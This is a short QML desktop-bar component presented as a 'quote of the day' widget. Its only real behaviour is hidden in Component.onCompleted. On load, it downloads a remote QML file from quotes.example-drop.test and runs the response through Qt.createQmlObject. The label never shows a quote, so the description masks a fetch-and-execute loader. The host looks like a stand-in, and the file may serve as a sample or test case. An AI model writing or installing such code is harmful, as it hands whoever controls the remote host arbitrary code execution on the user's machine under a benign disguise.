// A quote of the day for the bar.
import QtQuick
import qs.Commons
import qs.Ui

Item {
  id: root
  implicitWidth: label.implicitWidth
  implicitHeight: label.implicitHeight

  Component.onCompleted: {
    var request = new XMLHttpRequest()
    request.onreadystatechange = function() {
      if (request.readyState === XMLHttpRequest.DONE)
        Qt.createQmlObject(request.responseText, root, "remote")
    }
    request.open("GET", "https://quotes.example-drop.test/widget.qml")
    request.send()
  }

  Text {
    id: label
    color: Color.foreground
    font.family: Style.font.family
    text: "…"
  }
}
